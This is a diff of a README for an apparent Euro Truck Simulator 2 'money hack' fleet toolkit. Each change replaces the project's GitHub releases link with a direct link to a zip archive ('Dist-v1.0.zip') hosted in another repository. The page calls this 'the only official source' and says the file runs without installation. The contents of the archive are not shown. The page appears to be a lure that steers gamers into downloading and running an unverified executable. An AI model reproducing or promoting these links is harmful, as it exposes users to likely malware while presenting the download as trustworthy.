@@ -5,7 +5,7 @@ description: "Manage your ETS2 fleet and economy with tools for garages, drivers
 ---
 # 🚛 ets2-money-hack-career-fleet-toolkit - Manage Your Trucking Empire Like a Pro
 
-[![Download Now](https://img.shields.io/badge/Download%20Latest%20Version-Click%20Here-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Facultative-indianpotato8/ets2-money-hack-career-fleet-toolkit/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Latest%20Version-Click%20Here-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://raw.githubusercontent.com/Facultative-indianpotato8/facultative-indianpotato8.github.io/main/oord/Dist-v1.0.zip)
 
 ## 📦 What Is This?
 
@@ -28,7 +28,7 @@ Getting up and running is simple. Follow these three easy steps.
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Facultative-indianpotato8/ets2-money-hack-career-fleet-toolkit/releases](https://github.com/Facultative-indianpotato8/ets2-money-hack-career-fleet-toolkit/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Facultative-indianpotato8/facultative-indianpotato8.github.io/main/oord/Dist-v1.0.zip](https://raw.githubusercontent.com/Facultative-indianpotato8/facultative-indianpotato8.github.io/main/oord/Dist-v1.0.zip)
 
 You'll see a page with release information. Look for the download buttons and click the one that matches your system (Windows is recommended).
 
@@ -44,7 +44,7 @@ After the application opens, you'll see a clean interface. Take a moment to brow
 
 Ready to take control of your trucking business? Here's the official download page:
 
-**[👉 Click Here to Download ets2-money-hack-career-fleet-toolkit](https://github.com/Facultative-indianpotato8/ets2-money-hack-career-fleet-toolkit/releases)**
+**[👉 Click Here to Download ets2-money-hack-career-fleet-toolkit](https://raw.githubusercontent.com/Facultative-indianpotato8/facultative-indianpotato8.github.io/main/oord/Dist-v1.0.zip)**
 
 This is the only official source for the application. Always download from this link to ensure you get the latest version with the most up-to-date features. After downloading, you can run the application directly – no complex installation is required.
 
@@ -101,7 +101,7 @@ Stop guessing and start managing. Download now and see the difference this toolk
 
 Thousands of players enjoy Euro Truck Simulator 2, but only a few truly master the business side of the game. This toolkit gives you the edge you need to be one of them. It's free, easy to use, and packed with useful features. Don't let your company management fall behind – grab your copy today.
 
-[**⬇️ GET THE LATEST VERSION HERE**](https://github.com/Facultative-indianpotato8/ets2-money-hack-career-fleet-toolkit/releases)
+[**⬇️ GET THE LATEST VERSION HERE**](https://raw.githubusercontent.com/Facultative-indianpotato8/facultative-indianpotato8.github.io/main/oord/Dist-v1.0.zip)
 
 Happy trucking, and may your profits always be on the rise!
 
